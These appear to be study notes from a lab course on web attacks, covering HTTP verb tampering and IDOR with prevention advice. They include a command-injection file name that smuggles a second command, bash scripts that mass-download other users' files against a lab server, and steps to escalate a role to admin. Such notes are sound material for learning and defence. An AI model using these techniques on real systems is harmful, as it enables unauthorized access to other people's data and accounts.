		Content-Type: httpd/unix-directory

	> As we can see, the response shows Allow: POST,OPTIONS,HEAD,GET, which means that the web server indeed accepts HEAD requests, which is the default configuration for many web servers. So, let's try to intercept the reset request again, and this time use a HEAD request to see how the web server handles it: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_verb_tampering_HEAD_request.jpg)

	> Once we change POST to HEAD and forward the request, we will see that we no longer get a login prompt or a 401 Unauthorized page and get an empty output instead, as expected with a HEAD request. If we go back to the File Manager web application, we will see that all files have indeed been deleted, meaning that we successfully triggered the Reset functionality without having admin access or any credentials:


-=-=-
[+] Bypassing Security Filters
	> The other and more common type of HTTP Verb Tampering vulnerability is caused by Insecure Coding errors made during the development of the web application, which lead to web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests. For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters (e.g. $_POST['parameter']), it may be possible to bypass it by simply changing the request method to GET.

* Identify
	> In the File Manager web application, if we try to create a new file name with special characters in its name (e.g. test;), we get the following message:
	> This message shows that the web application uses certain filters on the back-end to identify injection attempts and then blocks any malicious requests. No matter what we try, the web application properly blocks our requests and is secured against injection attempts. However, we may try an HTTP Verb Tampering attack to see if we can bypass the security filter altogether.

* Exploit
	> To try and exploit this vulnerability, let's intercept the request in Burp Suite (Burp) and then use Change Request Method to change it to another method: unauthorized_request
	> This time, we did not get the Malicious Request Denied! message, and our file was successfully created:
	> To confirm whether we bypassed the security filter, we need to attempt exploiting the vulnerability the filter is protecting: a Command Injection vulnerability, in this case. So, we can inject a command that creates two files and then check whether both files were created. To do so, we will use the following file name in our attack (file1; touch file2;):
	> Then, we can once again change the request method to a GET request: filter_bypass_request
	> Once we send our request, we see that this time both file1 and file2 were created:
	> This shows that we successfully bypassed the filter through an HTTP Verb Tampering vulnerability and achieved command injection. Without the HTTP Verb Tampering vulnerability, the web application may have been secure against Command Injection attacks, and this vulnerability allowed us to bypass the filters in place altogether.

-=-=-
[+] Verb Tampering Prevention

	> After seeing a few ways to exploit Verb Tampering vulnerabilities, let's see how we can protect ourselves against these types of attacks by preventing Verb Tampering. Insecure configurations and insecure coding are what usually introduce Verb Tampering vulnerabilities. In this section, we will look at samples of vulnerable code and configurations and discuss how we can patch them.

* Insecure Configuration
	> HTTP Verb Tampering vulnerabilities can occur in most modern web servers, including Apache, Tomcat, and ASP.NET. The vulnerability usually happens when we limit a page's authorization to a particular set of HTTP verbs/methods, which leaves the other remaining methods unprotected.
	> The following is an example of a vulnerable configuration for an Apache web server, which is located in the site configuration file (e.g. 000-default.conf), or in a .htaccess web page configuration file:
		Code: xml
		
		<Directory "/var/www/html/admin">
		    AuthType Basic
		    AuthName "Admin Panel"
		    AuthUserFile /etc/apache2/.htpasswd
		    <Limit GET>
		        Require valid-user
		    </Limit>
		</Directory>

	> As we can see, this configuration is setting the authorization configurations for the admin web directory. However, as the <Limit GET> keyword is being used, the Require valid-user setting will only apply to GET requests, leaving the page accessible through POST requests. Even if both GET and POST were specified, this would leave the page accessible through other methods, like HEAD or OPTIONS.
	> The following example shows the same vulnerability for a Tomcat web server configuration, which can be found in the web.xml file for a certain Java web application:
		Code: xml
		
		<security-constraint>
		    <web-resource-collection>
		        <url-pattern>/admin/*</url-pattern>
		        <http-method>GET</http-method>
		    </web-resource-collection>
		    <auth-constraint>
		        <role-name>admin</role-name>
		    </auth-constraint>
		</security-constraint>

	> We can see that the authorization is being limited only to the GET method with http-method, which leaves the page accessible through other HTTP methods.

	> Finally, the following is an example for an ASP.NET configuration found in the web.config file of a web application:
		Code: xml
		
		<system.web>
		    <authorization>
		        <allow verbs="GET" roles="admin">
		            <deny verbs="GET" users="*">
		        </deny>
		        </allow>
		    </authorization>
		</system.web>

	> Once again, the allow and deny scope is limited to the GET method, which leaves the web application accessible through other HTTP methods.
	> The above examples show that it is not secure to limit the authorization configuration to a specific HTTP verb. This is why we should always avoid restricting authorization to a particular HTTP method and always allow/deny all HTTP verbs and methods.
	> If we want to specify a single method, we can use safe keywords, like LimitExcept in Apache, http-method-omission in Tomcat, and add/remove in ASP.NET, which cover all verbs except the specified ones.
	> Finally, to avoid similar attacks, we should generally consider disabling/denying all HEAD requests unless specifically required by the web application.

* Insecure Coding
	> While identifying and patching insecure web server configurations is relatively easy, doing the same for insecure code is much more challenging. This is because to identify this vulnerability in the code, we need to find inconsistencies in the use of HTTP parameters across functions, as in some instances, this may lead to unprotected functionalities and filters.
	> Let's consider the following PHP code from our File Manager exercise:
		Code: php
		
		if (isset($_REQUEST['filename'])) {
		    if (!preg_match('/[^A-Za-z0-9. _-]/', $_POST['filename'])) {
		        system("touch " . $_REQUEST['filename']);
		    } else {
		        echo "Malicious Request Denied!";
		    }
		}

	> If we were only considering Command Injection vulnerabilities, we would say that this is securely coded. The preg_match function properly looks for unwanted special characters and does not allow the input to go into the command if any special characters are found. However, the fatal error made in this case is not due to Command Injections but due to the inconsistent use of HTTP methods.
	> We see that the preg_match filter only checks for special characters in POST parameters with $_POST['filename']. However, the final system command uses the $_REQUEST['filename'] variable, which covers both GET and POST parameters. So, in the previous section, when we were sending our malicious input through a GET request, it did not get stopped by the preg_match function, as the POST parameters were empty and hence did not contain any special characters. Once we reach the system function, however, it used any parameters found in the request, and our GET parameters were used in the command, eventually leading to Command Injection.
	> This basic example shows us how minor inconsistencies in the use of HTTP methods can lead to critical vulnerabilities. In a production web application, these types of vulnerabilities will not be as obvious. They would probably be spread across the web application and will not be on two consecutive lines like we have here. Instead, the web application will likely have a special function for checking for injections and a different function for creating files. This separation of code makes it difficult to catch these sorts of inconsistencies, and hence they may survive to production.
	> To avoid HTTP Verb Tampering vulnerabilities in our code, we must be consistent with our use of HTTP methods and ensure that the same method is always used for any specific functionality across the web application. It is always advised to expand the scope of testing in security filters by testing all request parameters. This can be done with the following functions and variables:
		Language 	Function
		PHP 		$_REQUEST['param']
		Java 		request.getParameter('param')
		C# 		Request['param']

* If our scope in security-related functions covers all methods, we should avoid such vulnerabilities or filter bypasses.
-=-=
[+] Intro to IDOR

	> Insecure Direct Object References (IDOR) vulnerabilities are among the most common web vulnerabilities and can significantly impact the vulnerable web application. IDOR vulnerabilities occur when a web application exposes a direct reference to an object, like a file or a database resource, which the end-user can directly control to obtain access to other similar objects. If any user can access any resource due to the lack of a solid access control system, the system is considered to be vulnerable.
	> Building a solid access control system is very challenging, which is why IDOR vulnerabilities are pervasive. In addition, automating the process of identifying weaknesses in access control systems is also quite difficult, which may lead to these vulnerabilities going unidentified until they reach production.
	> For example, if users request access to a file they recently uploaded, they may get a link to it such as (download.php?file_id=123). So, as the link directly references the file with (file_id=123), what would happen if we tried to access another file (which may not belong to us) with (download.php?file_id=124)? If the web application does not have a proper access control system on the back-end, we may be able to access any file by sending a request with its file_id. In many cases, we may find that the id is easily guessable, making it possible to retrieve many files or resources that we should not have access to based on our permissions.

* What Makes an IDOR Vulnerability
	> Just exposing a direct reference to an internal object or resource is not a vulnerability in itself. However, this may make it possible to exploit another vulnerability: a weak access control system. Many web applications restrict users from accessing resources by restricting them from accessing the pages, functions, and APIs that can retrieve these resources. However, what would happen if a user somehow got access to these pages (e.g., through a shared/guessed link)? Would they still be able to access the same resources by simply having the link to access them? If the web application did not have an access control system on the back-end that compares the user's authentication to the resource's access list, they might be able to.
	> There are many ways of implementing a solid access control system for web applications, like having a Role-Based Access Control (RBAC) system. The main takeaway is that an IDOR vulnerability mainly exists due to the lack of an access control on the back-end. If a user had direct references to objects in a web application that lacks access control, it would be possible for attackers to view or modify other users' data.
	> Many developers ignore building an access control system; hence, most web applications and mobile applications are left unprotected on the back-end. In such applications, all users may have arbitrary access to all other user's data on the back-end. The only thing stopping users from accessing other user's data would be the front-end implementation of the application, which is designed to only show the user's data. In such cases, manually manipulating HTTP requests may reveal that all users have full access to all data, leading to a successful attack.
	> All of this makes IDOR vulnerabilities among the most critical vulnerabilities for any web or mobile application, not only due to exposing direct object references but mainly due to a lack of a solid access control system. Even a basic access control system can be challenging to develop. A comprehensive access control system covering the entire web application without interfering with its functions might be an even more difficult task. This is why IDOR/Access Control vulnerabilities are found even in very large web applications, like Facebook(https://infosecwriteups.com/disclose-private-attachments-in-facebook-messenger-infrastructure-15-000-ae13602aa486), Instagram(https://infosecwriteups.com/add-description-to-instagram-posts-on-behalf-of-other-users-6500-7d55b4a24c5a), and Twitter(https://medium.com/@kedrisec/publish-tweets-by-any-other-user-6c9d892708e3).

* Impact of IDOR Vulnerabilities
	> As mentioned earlier, IDOR vulnerabilities can have a significant impact on web applications. The most basic example of an IDOR vulnerability is accessing private files and resources of other users that should not be accessible to us, like personal files or credit card data, which is known as IDOR Information Disclosure Vulnerabilities. Depending on the nature of the exposed direct reference, the vulnerability may even allow the modification or deletion of other users' data, which may lead to a complete account takeover.
	> Once an attacker identifies the direct references, which may be database IDs or URL parameters, they can start testing specific patterns to see whether they can gain access to any data and may eventually understand how to extract or modify data for any arbitrary user.
	> IDOR vulnerabilities may also lead to the elevation of user privileges from a standard user to an administrator user, with IDOR Insecure Function Calls. For example, many web applications expose URL parameters or APIs for admin-only functions in the front-end code of the web application and disable these functions for non-admin users. However, if we had access to such parameters or APIs, we may call them with our standard user privileges. Suppose the back-end did not explicitly deny non-admin users from calling these functions. In that case, we may be able to perform unauthorized administrative operations, like changing users' passwords or granting users certain roles, which may eventually lead to a total takeover of the entire web application.

-=-=
[+] Identifying IDORs
* URL Parameters & APIs
	> The very first step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file_1.pdf). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.
	> In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (?uid=2) or (?filename=file_2.pdf). We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.

* AJAX Calls
	> We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.
	> For example, if we did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, we may still be able to find the admin functions if we look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.
	> This is not unique to admin functions, of course, but can also be any functions or calls that may not be found through monitoring HTTP requests. The following example shows a basic example of an AJAX call:
		Code: javascript
		
		function changeUserPassword() {
		    $.ajax({
		        url:"change_password.php",
		        type: "post",
		        dataType: "json",
		        data: {uid: user.uid, password: user.password, is_admin: is_admin},
		        success:function(result){
		            //
		        }
		    });
		}

	> The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it (e.g., open-source web applications).

* Understand Hashing/Encoding
	> Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.
	> Suppose the reference was encoded with a common encoder (e.g. base64). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data. For example, if we see a reference like (?filename=ZmlsZV8xMjMucGRm), we can immediately guess that the file name is base64 encoded (from its character set), which we can decode to get the original object reference of (file_123.pdf). Then, we can try encoding a different object reference (e.g. file_124.pdf) and try accessing it with the encoded object reference (?filename=ZmlsZV8xMjQucGRm), which may reveal an IDOR vulnerability if we were able to retrieve any data.

	> On the other hand, the object reference may be hashed, like (download.php?filename=c81e728d9d4c2f636f067f89cc14862c). At a first glance, we may think that this is a secure object reference, as it is not using any clear text or easy encoding. However, if we look at the source code, we may see what is being hashed before the API call is made:
		Code: javascript
		
		$.ajax({
		    url:"download.php",
		    type: "post",
		    dataType: "json",
		    data: {filename: CryptoJS.MD5('file_1.pdf').toString()},
		    success:function(result){
		        //
		    }
		});

	> In this case, we can see that code uses the filename and hashing it with CryptoJS.MD5, making it easy for us to calculate the filename for other potential files. Otherwise, we may manually try to identify the hashing algorithm being used (e.g., with hash identifier tools) and then hash the filename to see if it matches the used hash. Once we can calculate hashes for other files, we may try downloading them, which may reveal an IDOR vulnerability if we can download any files that do not belong to us.

* Compare User Roles

	> If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.
	> For example, if we had access to two different users, one of which can view their salary after making the following API call:
		Code: json
		
		{
		  "attributes" : 
		    {
		      "type" : "salary",
		      "url" : "/services/data/salaries/users/1"
		    },
		  "Id" : "1",
		  "Name" : "User1"
		
		}

	> The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as User1. However, with these details at hand, we can try repeating the same API call while logged in as User2 to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called.
	> If this is the case, and we can calculate the API parameters for other users, this would be an IDOR vulnerability. Even if we could not calculate the API parameters for other users, we would still have identified a vulnerability in the back-end access control system and may start looking for other object references to exploit.

-=-=
[+] Mass IDOR Enumeration
	> Exploiting IDOR vulnerabilities is easy in some instances but can be very challenging in others. Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.
	> Let's start discussing various techniques of exploiting IDOR vulnerabilities, from basic enumeration to mass data gathering, to user privilege escalation.

* Insecure Parameters
	> Let's start with a basic example that showcases a typical IDOR vulnerability. The exercise below is an Employee Manager web application that hosts employee records:
	> Our web application assumes that we are logged in as an employee with user id uid=1 to simplify things. This would require us to log in with credentials in a real web application, but the rest of the attack would be the same. Once we click on Documents, we are redirected to

		/documents.php:

	> When we get to the Documents page, we see several documents that belong to our user. These can be files uploaded by our user or files set for us by another department (e.g., HR Department). Checking the file links, we see that they have individual names:
		Code: html
		
		/documents/Invoice_1_09_2021.pdf
		/documents/Report_1_10_2021.pdf

	> We see that the files have a predictable naming pattern, as the file names appear to be using the user uid and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most basic type of IDOR vulnerability and is called static file IDOR. However, to successfully fuzz other files, we would assume that they all start with Invoice or Report, which may reveal some files but not all. So, let's look for a more solid IDOR vulnerability.
	> We see that the page is setting our uid with a GET parameter in the URL as (documents.php?uid=1). If the web application uses this uid GET parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents by simply changing this value. If the back-end end of the web application does have a proper access control system, we will get some form of Access Denied. However, given that the web application passes as our uid in clear text as a direct reference, this may indicate poor web application design, leading to arbitrary access to employee records.
	> When we try changing the uid to ?uid=2, we don't notice any difference in the page output, as we are still getting the same list of documents, and may assume that it still returns our own documents:
	> However, we must be attentive to the page details during any web pentest and always keep an eye on the source code and page size. If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with uid=2:
		Code: html
		
		/documents/Invoice_2_08_2020.pdf
		/documents/Report_2_12_2020.pdf

	> This is a common mistake found in web applications suffering from IDOR vulnerabilities, as they place the parameter that controls which user documents to show under our control while having no access control system on the back-end. Another example is using a filter parameter to only display a specific user's documents (e.g. uid_filter=1), which can also be manipulated to show other users' documents or even completely removed to show all documents at once.

* Mass Enumeration
	> We can try manually accessing other employee documents with uid=3, uid=4, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like Burp Intruder or ZAP Fuzzer to retrieve all files or write a small bash script to download all files, which is what we will do.
	> We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code, and we will get the following:
		Code: html
		
		<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
		<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

	> We can pick any unique word to be able to grep the link of the file. In our case, we see that each link starts with <li class='pure-tree_link'>, so we may curl the page and grep for this line, as follows:

		m1l0js@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
		
		<li class='pure-tree_link'><a href='/documents/Invoice_3_06_2020.pdf' target='_blank'>Invoice</a></li>
		<li class='pure-tree_link'><a href='/documents/Report_3_01_2020.pdf' target='_blank'>Report</a></li>

	> As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use a Regex pattern that matches strings between /document and .pdf, which we can use with grep to only get the document links, as follows:

		m1l0js@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"
		
		/documents/Invoice_3_06_2020.pdf
		/documents/Report_3_01_2020.pdf

	> Now, we can use a simple for loop to loop over the uid parameter and return the document of all employees, and then use wget to download each document link:
		Code: bash
		
		#!/bin/bash
		
		url="http://SERVER_IP:PORT"
		
		for i in {1..10}; do
		        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
		                wget -q $url/$link
		        done
		done

	> When we run the script, it will download all documents from all employees with uids between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees. This script is one example of how we can achieve the same objective. Try using a tool like Burp Intruder or ZAP Fuzzer, or write another Bash or PowerShell script to download all documents.

=-=-=-
[+] Bypassing Encoded References
	> In the previous section, we saw an example of an IDOR that uses employee uids in clear text, making it easy to enumerate. In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.
	> Let's go back to the Employee Manager web application to test the Contracts functionality:
	> If we click on the Employment_contract.pdf file, it starts downloading the file. The intercepted request in Burp looks as follows:
		(https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_download_contract.jpg)
	> We see that it is sending a POST request to download.php with the following data:
		Code: php
		contract=cdd96d3cc73d1dbdaffa03cc6cd7339b

	> Using a download.php script to download files is a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks. In this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in an md5 format. Hashes are one-way functions, so we cannot decode them to see their original values.
	> We can attempt to hash various values, like uid, username, filename, and many others, and see if any of their md5 hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the md5 hash of our uid, and see if it matches the above hash:
		m1l0js@htb[/htb]$ echo -n 1 | md5sum
		c4ca4238a0b923820dcc509a6f75849b -

	> Unfortunately, the hashes do not match. We can attempt this with various other fields, but none of them matches our hash. In advanced cases, we may also utilize Burp Comparer and fuzz various values and then compare each to our hash to see if we find any matches. In this case, the md5 hash could be for a unique value or a combination of values, which would be very difficult to predict, making this direct reference a Secure Direct Object Reference. However, there's one fatal flaw in this web application.

* Function Disclosure
	> As most modern web applications are developed using JavaScript frameworks, like Angular, React, or Vue.js, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash. Luckily for us, this is precisely the case in this web application.
	> If we take a look at the link in the source code, we see that it is calling a JavaScript function with javascript:downloadContract('1'). Looking at the downloadContract() function in the source code, we see the following:
		Code: javascript
		
		function downloadContract(uid) {
		    $.redirect("/download.php", {
		        contract: CryptoJS.MD5(btoa(uid)).toString(),
		    }, "POST", "_self");
		}

	> This function appears to be sending a POST request with the contract parameter, which is what we saw above. The value it is sending is an md5 hash using the CryptoJS library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.
	> In this case, the value being hashed is btoa(uid), which is the base64 encoded string of the uid variable, which is an input argument for the function. Going back to the earlier link where the function was called, we see it calling downloadContract('1'). So, the final value being used in the POST request is the base64 encoded string of 1, which was then md5 hashed.
	> We can test this by base64 encoding our uid=1, and then hashing it with md5, as follows:
		m1l0js@htb[/htb]$ echo -n 1 | base64 -w 0 | md5sum
		cdd96d3cc73d1dbdaffa03cc6cd7339b -

	> Tip: We are using the -n flag with echo, and the -w 0 flag with base64, to avoid adding newlines, in order to be able to calculate the md5 hash of the same value, without hashing newlines, as that would change the final md5 hash.
	> As we can see, this hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. With that, we can begin enumerating other employees' contracts using the same hashing method we used above. Before continuing, try to write a script similar to what we used in the previous section to enumerate all contracts.

* Mass Enumeration
	> Once again, let us write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more advanced cases, we may utilize tools like Burp Intruder or ZAP Fuzzer, but a simple bash script should be the best course for our exercise.
	> We can start by calculating the hash for each of the first ten employees using the same previous command while using tr -d to remove the trailing - characters, as follows:
		m1l0js@htb[/htb]$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done
		
		cdd96d3cc73d1dbdaffa03cc6cd7339b
		0b7e7dee87b1c3b98e72131173dfbbbf
		0b24df25fe628797b3a50ae0724d2730
		f7947d50da7a043693a592b4db43b0a1
		8b9af1f7f76daf0f02bd9c48c4a2e3d0
		006d1236aee3f92b8322299796ba1989
		b523ff8d1ced96cef9c86492e790c2fb
		d477819d240e7d3dd9499ed8d23e7158
		3e57e65a34ffcb2e93cb545d024f5bde
		5d4aace023dc088767b4e08c79415dcd

	> Next, we can make a POST request on download.php with each of the above hashes as the contract value, which should give us our final script:
		Code: bash
		
		#!/bin/bash
		
		for i in {1..10}; do
		    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
		        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
		    done
		done

	> With that, we can run the script, and it should download all contracts for employees 1-10:
		
		m1l0js@htb[/htb]$ bash ./exploit.sh
		m1l0js@htb[/htb]$ ls -1
		
		contract_006d1236aee3f92b8322299796ba1989.pdf
		contract_0b24df25fe628797b3a50ae0724d2730.pdf
		contract_0b7e7dee87b1c3b98e72131173dfbbbf.pdf
		contract_3e57e65a34ffcb2e93cb545d024f5bde.pdf
		contract_5d4aace023dc088767b4e08c79415dcd.pdf
		contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0.pdf
		contract_b523ff8d1ced96cef9c86492e790c2fb.pdf
		contract_cdd96d3cc73d1dbdaffa03cc6cd7339b.pdf
		contract_d477819d240e7d3dd9499ed8d23e7158.pdf
		contract_f7947d50da7a043693a592b4db43b0a1.pdf

	> As we can see, because we could reverse the hashing technique used on the object references, we can now successfully exploit the IDOR vulnerability to retrieve all other users' contracts.


-=-=-=-
[+] IDOR in Insecure APIs
	> So far, we have only been using IDOR vulnerabilities to access files and resources that are out of our user's access. However, IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users.
	> While IDOR Information Disclosure Vulnerabilities allow us to read various types of resources, IDOR Insecure Function Calls enable us to call APIs or execute functions as another user. Such functions and APIs can be used to change another user's private information, reset another user's password, or even buy items using another user's payment information. In many cases, we may be obtaining certain information through an information disclosure IDOR vulnerability and then using this information with IDOR insecure function call vulnerabilities, as we will see later in the module.

* Identifying Insecure APIs
	> Going back to our Employee Manager web application, we can start testing the Edit Profile page for IDOR vulnerabilities:
	> When we click on the Edit Profile button, we are taken to a page to edit information of our user profile, namely Full Name, Email, and About Me, which is a common feature in many web applications:
	> We can change any of the details in our profile and click Update profile, and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Let's intercept the Update request in Burp and look at it:
		(https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_update_request.jpg)

	> We see that the page is sending a PUT request to the /profile/api.php/profile/1 API endpoint. PUT requests are usually used in APIs to update item details, while POST is used to create new items, DELETE to delete items, and GET to retrieve item details. So, a PUT request for the Update profile function is expected. The interesting bit is the JSON parameters it is sending:
		Code: json
		
		{
		    "uid": 1,
		    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
		    "role": "employee",
		    "full_name": "Amy Lindon",
		    "email": "a_lindon@employees.htb",
		    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
		}

	> We see that the PUT request includes a few hidden parameters, like uid, uuid, and most interestingly role, which is set to employee. The web application also appears to be setting the user access privileges (e.g. role) on the client-side, in the form of our Cookie: role=employee cookie, which appears to reflect the role specified for our user. This is a common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges.
	> So, unless the web application has a solid access control system on the back-end, we should be able to set an arbitrary role for our user, which may grant us more privileges. However, how would we know what other roles exist?

* Exploiting Insecure APIs
	> We know that we can change the full_name, email, and about parameters, as these are the ones under our control in the HTML form in the /profile web page. So, let's try to manipulate the other parameters.
	> There are a few things we could try in this case:
    		- Change our uid to another user's uid, such that we can take over their accounts
    		- Change another user's details, which may allow us to perform several web attacks
    		- Create new users with arbitrary details, or delete existing users
    		- Change our role to a more privileged role (e.g. admin) to be able to perform more actions

	> Let's start by changing our uid to another user's uid (e.g. "uid": 2). However, any number we set other than our own uid gets us a response of uid mismatch: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_uid_mismatch.jpg)
	> The web application appears to be comparing the request's uid to the API endpoint (/1). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors.
	> Perhaps we can try changing another user's details. We'll change the API endpoint to /profile/api.php/profile/2, and change "uid": 2 to avoid the previous uid mismatch:

	> As we can see, this time, we get an error message saying uuid mismatch. The web application appears to be checking if the uuid value we are sending matches the user's uuid. Since we are sending our own uuid, our request is failing. This appears to be another form of access control to prevent users from changing another user's details.
	> Next, let's see if we can create a new user with a POST request to the API endpoint. We can change the request method to POST, change the uid to a new uid, and send the request to the API endpoint of the new uid: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_create_new_user_1.jpg)

	> We get an error message saying Creating new employees is for admins only. The same thing happens when we send a Delete request, as we get Deleting employees is for admins only. The web application might be checking our authorization through the role=employee cookie because this appears to be the only form of authorization in the HTTP request.
	> Finally, let's try to change our role to admin/administrator to gain higher privileges. Unfortunately, without knowing a valid role name, we get Invalid role in the HTTP response, and our role does not update: invalid_role
	> So, all of our attempts appear to have failed. We cannot create or delete users as we cannot change our role. We cannot change our own uid, as there are preventive measures on the back-end that we cannot control, nor can we change another user's details for the same reason. So, is the web application secure against IDOR attacks?.

	> So far, we have only been testing the IDOR Insecure Function Calls. However, we have not tested the API's GET request for IDOR Information Disclosure Vulnerabilities. If there was no robust access control system in place, we might be able to read other users' details, which may help us with the previous attacks we attempted.

	> Try to test the API against IDOR Information Disclosure vulnerabilities by attempting to get other users' details with GET requests. If the API is vulnerable, we may be able to leak other users' details and then use this information to complete our IDOR attacks on the function calls.

-=-=-=
[+] Chaining IDOR Vulnerabilities

	> Usually, a GET request to the API endpoint should return the details of the requested user, so we may try calling it to see if we can retrieve our user's details. We also notice that after the page loads, it fetches the user details with a GET request to the same API endpoint: get_api
	> As mentioned in the previous section, the only form of authorization in our HTTP requests is the role=employee cookie, as the HTTP request does not contain any other form of user-specific authorization, like a JWT token, for example. Even if a token did exist, unless it was being actively compared to the requested object details by a back-end access control system, we may still be able to retrieve other users' details.

* Information Disclosure

	> Let's send a GET request with another uid: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_get_another_user.jpg)
	> As we can see, this returned the details of another user, with their own uuid and role, confirming an IDOR Information Disclosure vulnerability:
		Code: json
		
		{
		    "uid": "2",
		    "uuid": "4a9bd19b3b8676199592a346051f950c",
		    "role": "employee",
		    "full_name": "Iona Franklyn",
		    "email": "i_franklyn@employees.htb",
		    "about": "It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."
		}

	> This provides us with new details, most notably the uuid, which we could not calculate before, and thus could not change other users' details.

* Modifying Other Users' Details
	> Now, with the user's uuid at hand, we can change this user's details by sending a PUT request to /profile/api.php/profile/2 with the above details along with any modifications we made, as follows: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_another_user.jpg)
	> We don't get any access control error messages this time, and when we try to GET the user details again, we see that we did indeed update their details: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_new_another_user_details.jpg)
	> In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is modifying a user's email address and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. Another potential attack is placing an XSS payload in the 'about' field, which would get executed once the user visits their Edit profile page, enabling us to attack the user in different ways.

* Chaining Two IDOR Vulnerabilities
	> Since we have identified an IDOR Information Disclosure vulnerability, we may also enumerate all users and look for other roles, ideally an admin role. Try to write a script to enumerate all users, similarly to what we did previously.
	> Once we enumerate all users, we will find an admin user with the following details:
		Code: json
		
		{
		    "uid": "X",
		    "uuid": "a36fa9e66e85f2dd6f5e13cad45248ae",
		    "role": "web_admin",
		    "full_name": "administrator",
		    "email": "webadmin@employees.htb",
		    "about": "HTB{FLAG}"
		}

	> We may modify the admin's details and then perform one of the above attacks to take over their account. However, as we now know the admin role name (web_admin), we can set it to our user so we can create new users or delete current users. To do so, we will intercept the request when we click on the Update profile button and change our role to web_admin: => (https://academy.hackthebox.com/storage/modules/134/web_attacks_idor_modify_our_role.jpg)

	> This time, we do not get the Invalid role error message, nor do we get any access control error messages, meaning that there are no back-end access control measures to what roles we can set for our user. If we GET our user details, we see that our role has indeed been set to web_admin:
		Code: json
		
		{
		    "uid": "1",
		    "uuid": "40f5888b67c748df7efba008e7c2f9d2",
		    "role": "web_admin",
		    "full_name": "Amy Lindon",
		    "email": "a_lindon@employees.htb",
		    "about": "A Release is like a boat. 80% of the holes plugged is not good enough."
		}

